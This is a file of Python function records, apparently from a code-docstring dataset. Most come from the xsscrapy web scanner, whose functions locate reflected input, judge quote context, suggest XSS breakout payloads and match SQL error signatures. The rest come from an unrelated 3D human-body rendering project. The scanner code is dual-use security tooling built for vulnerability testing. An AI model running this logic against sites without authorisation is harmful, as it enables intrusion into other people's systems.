"path": "xsscrapy/xsscrapy/pipelines.py", "commit_date": "2016-11-11 00:00:00", "repo_name": "DanMcInerney/xsscrapy", "stars": 1603, "license": "None", "language": "python", "size": 7736}
{"docstring": "''' Create the vuln item '''\n", "func_signal": "def make_item(self, meta, resp_url, line, unfiltered, sugg_payloads):\n", "code": "item = vuln()\n\nif isinstance(line, str):\n    item['line'] = line\nelse:\n    item['line'] = '\\n'.join(line)\nitem['xss_payload'] = meta['payload']\nitem['unfiltered'] = unfiltered\nitem['xss_param'] = meta['xss_param']\nitem['xss_place'] = meta['xss_place']\nitem['orig_url'] = meta['orig_url']\nitem['resp_url'] = resp_url\nif sugg_payloads:\n    item['sugg_payloads'] = ', '.join(sugg_payloads)\nif 'POST_to' in meta:\n    item['POST_to'] = meta['POST_to']\n\n# Just make sure one of the options has been set\nif item['unfiltered']:\n    return item", "path": "xsscrapy/xsscrapy/pipelines.py", "commit_date": "2016-11-11 00:00:00", "repo_name": "DanMcInerney/xsscrapy", "stars": 1603, "license": "None", "language": "python", "size": 7736}
{"docstring": "''' Returns the obj as either True or None '''\n", "func_signal": "def opposite(self, obj):\n", "code": "if obj:\n    obj = None\nelse:\n    obj = True\nreturn obj", "path": "xsscrapy/xsscrapy/pipelines.py", "commit_date": "2016-11-11 00:00:00", "repo_name": "DanMcInerney/xsscrapy", "stars": 1603, "license": "None", "language": "python", "size": 7736}
{"docstring": "''' Creates injection points for the xpath that finds the payload in any html enclosed text '''\n", "func_signal": "def parse_text_xpath(self, xpath, search_str, doc):\n", "code": "text_inj = []\nfor x in xpath:\n    parent = x.getparent()\n    # In case parent is a Comment()\n    while callable(parent.tag):\n        parent = parent.getparent()\n    tag = parent.tag\n    tag_index = self.get_elem_position(parent, doc)\n    found = re.findall(search_str, x.strip())\n    for f in found:\n        text_inj.append((tag_index, tag, None, None))\nreturn text_inj", "path": "xsscrapy/xsscrapy/pipelines.py", "commit_date": "2016-11-11 00:00:00", "repo_name": "DanMcInerney/xsscrapy", "stars": 1603, "license": "None", "language": "python", "size": 7736}
{"docstring": "''' Iterate through all elements in doc\nand match them up against the element found\nduring xpathing '''\n", "func_signal": "def get_elem_position(self, elem, doc):\n", "code": "order = 0\nfor i in doc.iter():\n    order += 1\n    if i == elem:\n        return order", "path": "xsscrapy/xsscrapy/pipelines.py", "commit_date": "2016-11-11 00:00:00", "repo_name": "DanMcInerney/xsscrapy", "stars": 1603, "license": "None", "language": "python", "size": 7736}
{"docstring": "''' Goes through char by char to determine if double\nor single quotes are open or not: True/None '''\n", "func_signal": "def get_quote_context(self, line):\n", "code": "dquote_open = None\nsquote_open = None\n# For something like <script>\"hey\":\"hello's\"</script> needed a way to remove the single quote\n# from being considered open since it's not actually important. This prevents a lot of false+\n# like in ebay.com and twitter.com\nfirst_open = None\nfor c in line:\n    if c == '\"':\n        # I have noticed that booking.com throws false+ with this first_open stuff\n        if not first_open:\n            first_open = c\n        dquote_open = self.opposite(dquote_open)\n        if first_open == '\"' and dquote_open == None:\n            first_open = None\n            if squote_open == True:\n                squote_open = None\n    elif c == \"'\":\n        if not first_open:\n            first_open = c\n        squote_open = self.opposite(squote_open)\n        if first_open == \"'\" and squote_open == None:\n            first_open = None\n            if dquote_open == True:\n                dquote_open = None\n\nreturn dquote_open, squote_open", "path": "xsscrapy/xsscrapy/pipelines.py", "commit_date": "2016-11-11 00:00:00", "repo_name": "DanMcInerney/xsscrapy", "stars": 1603, "license": "None", "language": "python", "size": 7736}
{"docstring": "''' HTML tag attributes that allow javascript TAKEN OUT AT THE MOMENT'''\n\n", "func_signal": "def event_attributes(self):\n", "code": "event_attributes = ['onafterprint', 'onbeforeprint', 'onbeforeunload', 'onerror',\n                    'onhaschange', 'onload', 'onmessage', 'onoffline', 'ononline',\n                    'onpagehide', 'onpageshow', 'onpopstate', 'onredo', 'onresize',\n                    'onstorage', 'onundo', 'onunload', 'onblur', 'onchange',\n                    'oncontextmenu', 'onfocus', 'onformchange', 'onforminput',\n                    'oninput', 'oninvalid', 'onreset', 'onselect', 'onsubmit',\n                    'onkeydown', 'onkeypress', 'onkeyup', 'onclick', 'ondblclick',\n                    'ondrag', 'ondragend', 'ondragenter', 'ondragleave', 'ondragover',\n                    'ondragstart', 'ondrop', 'onmousedown', 'onmousemove',\n                    'onmouseout', 'onmouseover', 'onmouseup', 'onmousewheel',\n                    'onscroll', 'onabort', 'oncanplay', 'oncanplaythrough',\n                    'ondurationchange', 'onemptied', 'onended', 'onerror',\n                    'onloadeddata', 'onloadedmetadata', 'onloadstart', 'onpause',\n                    'onplay', 'onplaying', 'onprogress', 'onratechange',\n                    'onreadystatechange', 'onseeked', 'onseeking', 'onstalled',\n                    'onsuspend', 'ontimeupdate', 'onvolumechange', 'onwaiting']\nreturn event_attributes", "path": "xsscrapy/xsscrapy/pipelines.py", "commit_date": "2016-11-11 00:00:00", "repo_name": "DanMcInerney/xsscrapy", "stars": 1603, "license": "None", "language": "python", "size": 7736}
{"docstring": "''' Parse the xpath comment search findings '''\n", "func_signal": "def parse_comm_xpath(self, xpath, search_str, doc):\n", "code": "comm_inj = []\nfor x in xpath:\n    parent = x.getparent()\n    text = x.text\n    found = re.findall(search_str, text)\n    for f in found:\n        tag_index = self.get_elem_position(x, doc)\n        # Set this tag so when we split the final line\n        # We split it at '<' + tag so that gives us\n        # a split at <!--\n        tag = '!--'\n        comm_inj.append((tag_index, tag, None, None))\nreturn comm_inj", "path": "xsscrapy/xsscrapy/pipelines.py", "commit_date": "2016-11-11 00:00:00", "repo_name": "DanMcInerney/xsscrapy", "stars": 1603, "license": "None", "language": "python", "size": 7736}
{"docstring": "''' Check for the special chars and append them to a master list of tuples, one tuple per injection point\nAlways returns a string '''\n\n", "func_signal": "def get_reflected_chars(self, tag, attr, ref_payload, delim, body, match_end_offset):\n", "code": "returned_chars = ref_payload.replace(delim, '').replace('9','')\n\nreturn returned_chars", "path": "xsscrapy/xsscrapy/pipelines.py", "commit_date": "2016-11-11 00:00:00", "repo_name": "DanMcInerney/xsscrapy", "stars": 1603, "license": "None", "language": "python", "size": 7736}
{"docstring": "''' Combine lxml injection data with the 2 regex injection search data '''\n\n", "func_signal": "def combine_regex_lxml(self, lxml_injs, full_matches, body, mismatch, payload, delim):\n", "code": "all_inj_data = {}\n\nfor idx, match in enumerate(full_matches):\n    try:\n        tag_index, tag = lxml_injs[idx][0]\n    except IndexError:\n        if mismatch:\n            return\n        else:\n            raise\n\n    # Always returns a populated dict, even if its {None:None} like\n    # with inbetween tag injections\n    attrs_attrvals = lxml_injs[idx][1]\n    if attrs_attrvals:\n        for a in attrs_attrvals:\n            attr = a\n            attr_val = attrs_attrvals[a]\n    # I don't think this is necessary now that we use lxml.html.soupparse.fromstring rather than lxml.html.fromstring\n    else:\n        spider.log(\"Error: Possible broken HTML. Lxml failed to find the attribute. twitter.com/?q=[payload] is an example.\")\n        continue\n    # If it's an attribute inj then the tag will always be \"<tag \"\n    # If it's an injection in a comment or between tags\n    # it will always start with \"<tag\" (comment inj tag = \"!--\")\n    if attr:\n        tag_delim = '<'+tag+' '\n    else:\n        tag_delim = '<'+tag\n\n    match_start_offset = match[0]\n    ret_between_delim = match[1]\n    match_end_offset = match[2]\n    sub = delim+'subbed'\n\n    start_of_match = body[match_start_offset:]\n    ref_payload_plus_2 = start_of_match[:(match_end_offset - match_start_offset)+2]\n    ref_payload = start_of_match[:(match_end_offset - match_start_offset)]\n    # ref_payload would only equal ref_payload_plus_2 if ;9 doesn't exist\n    if ref_payload != ref_payload_plus_2:\n        if ref_payload_plus_2[-2:] == ';9':\n            ref_payload = ref_payload_plus_2\n\n    # split the body at the tag, then take the last fragment\n    # which is closest to the injection point as regexed\n    split_body = body[:match_start_offset]\n    line_no_tag = split_body.split(tag_delim)[-1]#.replace('\\\\\"', '').replace(\"\\\\'\", \"\")\n    line = tag_delim + line_no_tag + ref_payload\n    # Sometimes it may split wrong, in which case we drop that lxml match\n    if line_no_tag.startswith('<doctype') or line_no_tag.startswith('<html'):\n        line = ''\n\n    # Get the accurate attr, as the original attr and attr_val in this function\n    # would just be the first one found even if there were >1 attributes in lxml_injs\n    if attr:\n        attr_dict = self.accurate_attr(tag, attrs_attrvals, match, line)\n        for a in attr_dict:\n            attr = a\n            attr_val = attr_dict[a]\n            break\n\n    unfiltered_chars = self.get_unfiltered_chars(payload, ref_payload, delim, tag, attr)\n    # Common false+ shows only \"> as unfiltered if script parses the chars between 2 unrelated delim strs\n    #if unfiltered_chars == '\">':\n    #    unfiltered_chars = ''\n    all_inj_data[match_start_offset] = [tag_index, tag, attr, attr_val, payload, unfiltered_chars, line]\n\nreturn all_inj_data", "path": "xsscrapy/xsscrapy/pipelines.py", "commit_date": "2016-11-11 00:00:00", "repo_name": "DanMcInerney/xsscrapy", "stars": 1603, "license": "None", "language": "python", "size": 7736}
{"docstring": "''' Make sure we're not just repeating the same URL XSS over and over '''\n\n", "func_signal": "def url_item_filtering(self, item, spider):\n", "code": "if item['xss_place'] == 'url':\n\n    if len(self.url_param_xss_items) > 0:\n\n        for i in self.url_param_xss_items:\n            # If the injection param, the url up until the injected param and the payload\n            # are all the same as a previous item, then don't bother creating the item\n\n            # Match tags where injection point was found\n            if item['xss_param'] == i['xss_param']:\n\n                # Match the URL up until the params\n                if item['orig_url'].split('?', 1)[0] == i['orig_url'].split('?', 1)[0]:\n\n                    # Match the payload\n                    if item['xss_payload'] == i['xss_payload']:\n\n                        # Match the unfiltered characters\n                        if item['unfiltered'] == i['unfiltered']:\n\n                            raise DropItem('Duplicate item found: %s' % item['orig_url'])\n\n    self.url_param_xss_items.append(item)\n\nreturn item", "path": "xsscrapy/xsscrapy/pipelines.py", "commit_date": "2016-11-11 00:00:00", "repo_name": "DanMcInerney/xsscrapy", "stars": 1603, "license": "None", "language": "python", "size": 7736}
{"docstring": "''' Remove commented JS lines which screw with quote detection '''\n", "func_signal": "def decomment_js(self, line):\n", "code": "lines = line.splitlines()\ndecommented_lines = [l for l in lines if not l.strip().startswith('//')]\nline = '\\n'.join(decommented_lines)\nreturn line", "path": "xsscrapy/xsscrapy/pipelines.py", "commit_date": "2016-11-11 00:00:00", "repo_name": "DanMcInerney/xsscrapy", "stars": 1603, "license": "None", "language": "python", "size": 7736}
{"docstring": "''' Find all tags with attributes that contain the subbed str '''\n", "func_signal": "def parse_attr_xpath(self, xpath, search_str, doc):\n", "code": "attr_inj = []\nfor x in xpath:\n    # x = http://lxml.de/api/lxml.etree._Element-class.html\n    tag_index = self.get_elem_position(x, doc)\n    tag = x.tag\n    items = x.items()\n    for i in items:\n        #i = (attr, attr_val)\n        attr = i[0]\n        attr_val = i[1]\n        found = re.findall(search_str, attr_val)\n        for f in found:\n            attr_inj.append((tag_index, tag, attr, attr_val))\nreturn attr_inj", "path": "xsscrapy/xsscrapy/pipelines.py", "commit_date": "2016-11-11 00:00:00", "repo_name": "DanMcInerney/xsscrapy", "stars": 1603, "license": "None", "language": "python", "size": 7736}
{"docstring": "# Replace the payloaded string with just the delim string (minus the ; )\n", "func_signal": "def get_lxml_matches(self, full_match, body, resp_url, delim):\n", "code": "sub = delim+'subbed'\nsubbed_body = re.sub(full_match, sub, body)\ndoc = self.html_parser(subbed_body, resp_url)\nlxml_injs = self.xpath_inj_points(sub, doc)\nreturn lxml_injs", "path": "xsscrapy/xsscrapy/pipelines.py", "commit_date": "2016-11-11 00:00:00", "repo_name": "DanMcInerney/xsscrapy", "stars": 1603, "license": "None", "language": "python", "size": 7736}
{"docstring": "''' Do a quick lookup in the response body for SQL errors. Both w3af's and DSSS.py's methods are in here\nbut sectoolsmarket.com shows DSSS as having better detection rates so using theirs '''\n\n# Taken from Damn Small SQLi Scanner\n", "func_signal": "def sqli_check(self, body, orig_body):\n", "code": "DBMS_ERRORS = {\"MySQL\":                (r\"SQL syntax.*MySQL\", r\"Warning.*mysql_.*\", r\"valid MySQL result\", r\"MySqlClient\\.\"),\n               \"PostgreSQL\":           (r\"PostgreSQL.*ERROR\", r\"Warning.*\\Wpg_.*\", r\"valid PostgreSQL result\", r\"Npgsql\\.\"),\n               \"Microsoft SQL Server\": (r\"Driver.* SQL[\\-\\_\\ ]*Server\", r\"OLE DB.* SQL Server\", r\"(\\W|\\A)SQL Server.*Driver\", r\"Warning.*mssql_.*\",\n                                        r\"(\\W|\\A)SQL Server.*[0-9a-fA-F]{8}\", r\"(?s)Exception.*\\WSystem\\.Data\\.SqlClient\\.\", r\"(?s)Exception.*\\WRoadhouse\\.Cms\\.\"),\n               \"Microsoft Access\":     (r\"Microsoft Access Driver\", r\"JET Database Engine\", r\"Access Database Engine\"),\n               \"Oracle\":               (r\"ORA-[0-9][0-9][0-9][0-9]\", r\"Oracle error\", r\"Oracle.*Driver\", r\"Warning.*\\Woci_.*\", r\"Warning.*\\Wora_.*\")}\nfor (dbms, regex) in ((dbms, regex) for dbms in DBMS_ERRORS for regex in DBMS_ERRORS[dbms]):\n    if re.search(regex, body, re.I) and not re.search(regex, orig_body, re.I):\n        return (dbms, regex)\nreturn None, None\n\n# Taken from w3af\n#SQL_errors = (\"System.Data.OleDb.OleDbException\",\n#              \"[SQL Server]\",\n#              \"[Microsoft][ODBC SQL Server Driver]\",\n#              \"[SQLServer JDBC Driver]\",\n#              \"[SqlException\",\n#              \"System.Data.SqlClient.SqlException\",\n#              \"Unclosed quotation mark after the character string\",\n#              \"'80040e14'\",\n#              \"mssql_query()\",\n#              \"odbc_exec()\",\n#              \"Microsoft OLE DB Provider for ODBC Drivers\",\n#              \"Microsoft OLE DB Provider for SQL Server\",\n#              \"Incorrect syntax near\",\n#              \"Sintaxis incorrecta cerca de\",\n#              \"Syntax error in string in query expression\",\n#              \"ADODB.Field (0x800A0BCD)<br>\",\n#              \"ADODB.Recordset'\",\n#              \"Unclosed quotation mark before the character string\",\n#              \"'80040e07'\",\n#              \"Microsoft SQL Native Client error\",\n#              \"SQLCODE\",\n#              \"DB2 SQL error:\",\n#              \"SQLSTATE\",\n#              \"[CLI Driver]\",\n#              \"[DB2/6000]\",\n#              \"Sybase message:\",\n#              \"Sybase Driver\",\n#              \"[SYBASE]\",\n#              \"Syntax error in query expression\",\n#              \"Data type mismatch in criteria expression.\",\n#              \"Microsoft JET Database Engine\",\n#              \"[Microsoft][ODBC Microsoft Access Driver]\",\n#              \"Microsoft OLE DB Provider for Oracle\",\n#              \"wrong number or types\",\n#              \"PostgreSQL query failed:\",\n#              \"supplied argument is not a valid PostgreSQL result\",\n#              \"unterminated quoted string at or near\",\n#              \"pg_query() [:\",\n#              \"pg_exec() [:\",\n#              \"supplied argument is not a valid MySQL\",\n#              \"Column count doesn\\'t match value count at row\",\n#              \"mysql_fetch_array()\",\n#              \"mysql_\",\n#              \"on MySQL result index\",\n#              \"You have an error in your SQL syntax;\",\n#              \"You have an error in your SQL syntax near\",\n#              \"MySQL server version for the right syntax to use\",\n#              \"Division by zero in\",\n#              \"not a valid MySQL result\",\n#              \"[MySQL][ODBC\",\n#              \"Column count doesn't match\",\n#              \"the used select statements have different number of columns\",\n#              \"DBD::mysql::st execute failed\",\n#              \"DBD::mysql::db do failed:\",\n#              \"com.informix.jdbc\",\n#              \"Dynamic Page Generation Error:\",\n#              \"An illegal character has been found in the statement\",\n#              \"[Informix]\",\n#              \"<b>Warning</b>:  ibase_\",\n#              \"Dynamic SQL Error\",\n#              \"[DM_QUERY_E_SYNTAX]\",\n#              \"has occurred in the vicinity of:\",\n#              \"A Parser Error (syntax error)\",\n#              \"java.sql.SQLException\",\n#              \"Unexpected end of command in statement\",\n#              \"[Macromedia][SQLServer JDBC Driver]\",\n#              \"could not prepare statement\",\n#              \"Unknown column\",\n#              \"where clause\",\n#              \"SqlServer\",\n#              \"syntax error\")\n#for e in SQL_errors:\n#    if e in body and e not in orig_body:\n#        return e", "path": "xsscrapy/xsscrapy/pipelines.py", "commit_date": "2016-11-11 00:00:00", "repo_name": "DanMcInerney/xsscrapy", "stars": 1603, "license": "None", "language": "python", "size": 7736}
{"docstring": "''' XSS logic. Returns None if vulnerability not found \nThe breakout_chars var is a list(set()). This ensure we can\ntest for breakout given OR statements, like \" or ; to breakout'''\n# Gets rid of some false positives\n# ex: https://www.facebook.com/directory/pages/9zqjxpo'%22()%7B%7D%3Cx%3E:9zqjxpo;9\n#if len(unfiltered) > len(self.test_str):\n#    return\n# Unpack the injection\n#tag_index, tag, attr, attr_val, payload, unfiltered_chars, line = injection\n# get_unfiltered_chars() can only return a string 0+ characters, but never None\n", "func_signal": "def xss_logic(self, injection, meta, resp_url, error):\n", "code": "unfiltered_chars = injection[5]\npayload = injection[4]\n# injection[6] sometimes == '<p' maybe?\n# It happened POSTing chatRecord to http://service.taobao.com/support/minerva/robot_save_chat_record.htm\n# that page returned a Connection: Close header and no body\n############### THIS NEEDS TO BE THE REFLECTED PAYLOAD\nline = injection[6]\nitem_found = None\n\n# get_reflected_chars() always returns a string\nif len(unfiltered_chars) > 0:\n    chars_payloads = self.get_breakout_chars(injection, resp_url)\n    # breakout_chars always returns a , never None\n    if len(chars_payloads) > 0:\n        sugg_payloads = []\n        for chars in chars_payloads:\n            if set(chars).issubset(set(unfiltered_chars)):\n                # Get rid of possible payloads with > in them if > not in unfiltered_chars\n                item_found = True\n                for possible_payload in chars_payloads[chars]:\n                    if '>' not in unfiltered_chars:\n                        if '>' in possible_payload:\n                            continue\n                    sugg_payloads.append(possible_payload)\n\n        if item_found:\n            return self.make_item(meta, resp_url, line, unfiltered_chars, sugg_payloads)", "path": "xsscrapy/xsscrapy/pipelines.py", "commit_date": "2016-11-11 00:00:00", "repo_name": "DanMcInerney/xsscrapy", "stars": 1603, "license": "None", "language": "python", "size": 7736}
{"docstring": "''' Return the opposite quote of the one give, single for double or\ndouble for single '''\n", "func_signal": "def opposite_quote(self, quote):\n", "code": "if quote == '\"':\n    oppo_quote = \"'\"\nelse:\n    oppo_quote = '\"'\nreturn oppo_quote", "path": "xsscrapy/xsscrapy/pipelines.py", "commit_date": "2016-11-11 00:00:00", "repo_name": "DanMcInerney/xsscrapy", "stars": 1603, "license": "None", "language": "python", "size": 7736}
{"docstring": "\"\"\"Test whether it is executable.\"\"\"\n", "func_signal": "def test_case1(self):\n", "code": "faces = torch.randn(64, 16, 3, 3, dtype=torch.float32)\ntextures = torch.randn(64, 16, 8, 8, 8, 3, dtype=torch.float32)\nnr.lighting(faces, textures)", "path": "impersonator/thirdparty/neural_renderer/tests/test_lighting.py", "commit_date": "2019-07-12 00:00:00", "repo_name": "svip-lab/impersonator", "stars": 1725, "license": "other", "language": "python", "size": 102098}
{"docstring": "\"\"\"\n    make [(si_pred, si_ref), ...], and [(ci_pred, ci_ref), ...]\nArgs:\n    si_preds_files:\n    si_ref_files:\n    ci_preds_files:\n    ci_ref_files:\n\nReturns:\n    si_preds_ref_files:\n    ci_preds_ref_files:\n\"\"\"\n", "func_signal": "def post_format_metric_file_list(self, si_preds_files, si_ref_files, ci_preds_files, ci_ref_files):\n", "code": "si_preds_ref_files = list(zip(si_preds_files, si_ref_files))\nci_preds_ref_files = list(zip(ci_preds_files, ci_ref_files))\n\nreturn si_preds_ref_files, ci_preds_ref_files", "path": "impersonator/thirdparty/his_evaluators/his_evaluators/evaluators/motion_imitation.py", "commit_date": "2020-04-30 00:00:00", "repo_name": "svip-lab/impersonator", "stars": 1725, "license": "other", "language": "python", "size": 102098}
{"docstring": "\"\"\"\nComputes absolute joint locations given pose.\n\nrotate_base: if True, rotates the global rotation by 90 deg in x axis.\nif False, this is the original SMPL coordinate.\n\nArgs:\n  Rs: N x 24 x 3 x 3 rotation vector of K joints\n  Js: N x 24 x 3, joint locations before posing\n  parent: 24 holding the parent id for each index\n\nReturns\n  new_J : `Tensor`: N x 24 x 3 location of absolute joints\n  A     : `Tensor`: N x 24 x 4 x 4 relative joint transformations for LBS.\n\"\"\"\n\n", "func_signal": "def batch_global_rigid_transformation(Rs, Js, parent, rotate_base=False, device=\"cpu\"):\n", "code": "N = Rs.shape[0]\nif rotate_base:\n    # print('Flipping the SMPL coordinate frame!!!!')\n    # rot_x = np.array([[1, 0, 0], [0, -1, 0], [0, 0, -1]], dtype=Rs.dtype)\n    # rot_x = np.reshape(np.tile(rot_x, [N, 1]), (N, 3, 3))\n    # root_rotation = np.matmul(Rs[:, 0, :, :], rot_x)\n\n    rot_x = torch.from_numpy(np.array([[1, 0, 0], [0, -1, 0], [0, 0, -1]],\n                                      dtype=np.float32)).type(Rs.dtype).to(device)\n\n    # rot_x = torch.from_numpy(np.array([[-1, 0, 0], [0, 1, 0], [0, 0, -1]],\n    #                                   dtype=np.float32)).type(Rs.dtype).to(device)\n\n    rot_x = rot_x.repeat(N, 1).view(N, 3, 3)\n    root_rotation = torch.matmul(Rs[:, 0, :, :], rot_x)\nelse:\n    root_rotation = Rs[:, 0, :, :]\n\n# Now Js is N x 24 x 3 x 1\nJs = Js.unsqueeze(-1)\n\ndef make_A(R, t):\n    \"\"\"\n    Composite homogeneous matrix.\n    Args:\n        R: N x 3 x 3 rotation matrix.\n        t: N x 3 x 1 translation vector.\n\n    Returns:\n        homogeneous matrix N x 4 x 4.\n    \"\"\"\n\n    # # Rs is N x 3 x 3, ts is N x 3 x 1\n    # R_homo = np.pad(R, [[0, 0], [0, 1], [0, 0]], mode='constant')\n    # t_homo = np.concatenate([t, np.ones((N, 1, 1))], 1)\n    # return np.concatenate([R_homo, t_homo], 2)\n\n    # Pad to (N, 4, 3)\n    R_homo = F.pad(R, (0, 0, 0, 1, 0, 0), mode='constant', value=0)\n    # Concatenate to (N, 4, 1)\n    t_homo = torch.cat([t, torch.ones(N, 1, 1, dtype=Rs.dtype).to(device)], dim=1)\n    return torch.cat([R_homo, t_homo], dim=2)\n\n# root_rotation: (N, 3, 3), Js[:, 0]: (N, 3, 1)\n# ---------- A0: (N, 4, 4)\nA0 = make_A(root_rotation, Js[:, 0])\nresults = [A0]\nfor i in range(1, parent.shape[0]):\n    j_here = Js[:, i] - Js[:, parent[i]]\n    A_here = make_A(Rs[:, i], j_here)\n    res_here = torch.matmul(results[parent[i]], A_here)\n    results.append(res_here)\n\n# N x 24 x 4 x 4\nresults = torch.stack(results, dim=1)\n\nnew_J = results[:, :, :3, 3]\n\n# --- Compute relative A: Skinning is based on\n# how much the bone moved (not the final location of the bone)\n# but (final_bone - init_bone)\n# ---\n\n# Js_w0: (N, 24, 4, 1)\nJs_w0 = torch.cat([Js, torch.zeros(N, 24, 1, 1, dtype=Rs.dtype).to(device)], dim=2)\n\n# init_bone: (N, 24, 4, 1) = (N, 24, 4, 4) x (N, 24, 4, 1)\ninit_bone = torch.matmul(results, Js_w0)\n# Append empty 4 x 3:\ninit_bone = F.pad(init_bone, (3, 0, 0, 0, 0, 0, 0, 0), mode='constant', value=0)\nA = results - init_bone\n\nreturn new_J, A", "path": "impersonator/networks/batch_smpl.py", "commit_date": "2019-10-01 00:00:00", "repo_name": "svip-lab/impersonator", "stars": 1725, "license": "other", "language": "python", "size": 102098}
{"docstring": "\"\"\"\npkl_path is the path to a SMPL model\n\"\"\"\n", "func_signal": "def __init__(self, pkl_path, rotate=False):\n", "code": "super(SMPL, self).__init__()\nself.rotate = rotate\n\n# -- Load SMPL params --\ndd = load_pickle_file(pkl_path)\n\n# define faces\n# self.register_buffer('faces', torch.from_numpy(undo_chumpy(dd['f']).astype(np.int32)).type(dtype=torch.int32))\nself.faces = torch.from_numpy(dd['f'].astype(np.int32)).type(dtype=torch.int32)\n\n# Mean template vertices\nself.register_buffer('v_template', torch.FloatTensor(dd['v_template']))\n# Size of mesh [Number of vertices, 3], (6890, 3)\nself.size = [self.v_template.shape[0], 3]\nself.num_betas = dd['shapedirs'].shape[-1]\n# Shape blend shape basis (shapedirs): (6980, 3, 10)\n# reshaped to (6980*3, 10), transposed to (10, 6980*3)\nself.register_buffer('shapedirs', torch.FloatTensor(np.reshape(\n    dd['shapedirs'], [-1, self.num_betas]).T))\n\n# Regressor for joint locations given shape -> (24, 6890)\n# Transpose to shape (6890, 24)\nself.register_buffer('J_regressor', torch.FloatTensor(\n    np.asarray(dd['J_regressor'].T.todense())))\n\n# Pose blend shape basis: (6890, 3, 207)\nnum_pose_basis = dd['posedirs'].shape[-1]\n\n# Pose blend pose basis is reshaped to (6890*3, 207)\n# posedirs is transposed into (207, 6890*3)\nself.register_buffer('posedirs', torch.FloatTensor(np.reshape(\n    dd['posedirs'], [-1, num_pose_basis]).T))\n\n# indices of parents for each joints\nself.parents = np.array(dd['kintree_table'][0].astype(np.int32))\n\n# LBS weights (6890, 24)\nself.register_buffer('weights', torch.FloatTensor(dd['weights']))\n\n# This returns 19 keypoints: 6890 x 19\njoint_regressor = torch.FloatTensor(\n    np.asarray(dd['cocoplus_regressor'].T.todense()))\n\nself.register_buffer('joint_regressor', joint_regressor)", "path": "impersonator/networks/batch_smpl.py", "commit_date": "2019-10-01 00:00:00", "repo_name": "svip-lab/impersonator", "stars": 1725, "license": "other", "language": "python", "size": 102098}
{"docstring": "\"\"\" NOTE: not used bc I want to reuse R and this is simple.\nOutput of this is used to compute joint-to-pose blend shape mapping.\nEquation 9 in SMPL paper.\n\n\nArgs:\n  pose: `Tensor`, N x 72 vector holding the axis-angle rep of K joints.\n        This includes the global rotation so K=24\n\nReturns\n  diff_vec : `Tensor`: N x 207 rotation matrix of 23=(K-1) joints with identity subtracted.,\n\"\"\"\n\n# ignore global, N x 72\n", "func_signal": "def batch_lrotmin(theta, device=\"cpu\"):\n", "code": "theta = theta[:, 3:]\n# (N*23) x 3 x 3\n# reshape = contiguous + view\nRs = batch_rodrigues(theta.reshape(-1, 3))\neye = torch.eye(3).to(torch.eye(3))\nlrotmin = (Rs - eye).view(-1, 207)\n\nreturn lrotmin", "path": "impersonator/networks/batch_smpl.py", "commit_date": "2019-10-01 00:00:00", "repo_name": "svip-lab/impersonator", "stars": 1725, "license": "other", "language": "python", "size": 102098}
{"docstring": "\"\"\"\n\nArgs:\n    output_dir:\n\"\"\"\n\n", "func_signal": "def __init__(self, output_dir):\n", "code": "self.output_dir = mkdir(output_dir)\nself.si_out_dir = mkdir(os.path.join(output_dir, \"self_imitation\"))\nself.ci_out_dir = mkdir(os.path.join(output_dir, \"cross_imitation\"))\nself.num_preds_si = 0\nself.num_preds_ci = 0", "path": "impersonator/thirdparty/his_evaluators/his_evaluators/evaluators/motion_imitation.py", "commit_date": "2020-04-30 00:00:00", "repo_name": "svip-lab/impersonator", "stars": 1725, "license": "other", "language": "python", "size": 102098}
{"docstring": "\"\"\"\n    save the the results into the out_path.\nArgs:\n    out_path (str): the full path to save the results.\n    si_results (dict): the self-imitation results.\n    ci_result (dict): the cross-imitation results.\n\nReturns:\n    None\n\"\"\"\n\n", "func_signal": "def save_results(self, out_path, si_results, ci_result):\n", "code": "with open(out_path, \"w\") as writer:\n    writer.write(\"########################Self-imitation Results########################\\n\")\n    for key, val in si_results.items():\n        writer.write(\"{} = {}, quality = {}\\n\".format(key, val, TYPES_QUALITIES[key]))\n\n    writer.write(\"########################Cross-imitation Results########################\\n\")\n    for key, val in ci_result.items():\n        writer.write(\"{} = {}, quality = {}\\n\".format(key, val, TYPES_QUALITIES[key]))", "path": "impersonator/thirdparty/his_evaluators/his_evaluators/evaluators/motion_imitation.py", "commit_date": "2020-04-30 00:00:00", "repo_name": "svip-lab/impersonator", "stars": 1725, "license": "other", "language": "python", "size": 102098}
{"docstring": "\"\"\"\n:param key_points: coco format [14 or 19, 2]\n:return:\n\"\"\"\n", "func_signal": "def draw_skeleton(self, key_points, win_name, plus=False):\n", "code": "lsp_key_points_name = ['Right ankle', 'Right knee', 'Right hip', 'Left hip', 'Left knee', 'Left ankle', 'Right wrist', 'Right elbow', 'Right shoulder',\n                       'Left shoulder', 'Left elbow', 'Left wrist', 'Neck', 'Head top']\n\nlsp_plus_key_points_name = lsp_key_points_name + ['Nose', 'Left eye', 'Right eye', 'Left ear', 'Right ear']\n\n# start from 1\nlsp_kintree_table = [(14, 13), (13, 10), (10, 11), (11, 12), (13, 9), (9, 8), (8, 7), (13, 4), (13, 3), (4, 5), (5, 6), (3, 2), (2, 1)]\nlsp_plus_kintree_table = lsp_kintree_table + [(18, 16), (16, 15), (15, 17), (17, 19)]\n\n# minus 1 to start from 0\nlsp_kintree_table = [(k0 - 1, k1 - 1) for k0, k1 in lsp_kintree_table]\nlsp_plus_kintree_table = [(k0 - 1, k1 - 1) for k0, k1 in lsp_plus_kintree_table]\n\nif plus:\n    key_points_name = lsp_plus_key_points_name\n    kintree_table = lsp_plus_kintree_table\nelse:\n    key_points_name = lsp_key_points_name\n    kintree_table = lsp_kintree_table\n\nX = np.array([[key_points[k0][0], key_points[k1][0]] for k0, k1 in kintree_table]).T\nY = np.array([[key_points[k0][1], key_points[k1][1]] for k0, k1 in kintree_table]).T\n\nself.vis.line(Y, X, win=win_name, opts=dict(xtickmin=-1, xtickmax=1, xtickstep=0.2,\n                                            ytickmin=-1, ytickmax=1, ytickstep=0.2,\n                                            markers=True, title=win_name))", "path": "impersonator/utils/visdom_visualizer.py", "commit_date": "2019-09-20 00:00:00", "repo_name": "svip-lab/impersonator", "stars": 1725, "license": "other", "language": "python", "size": 102098}
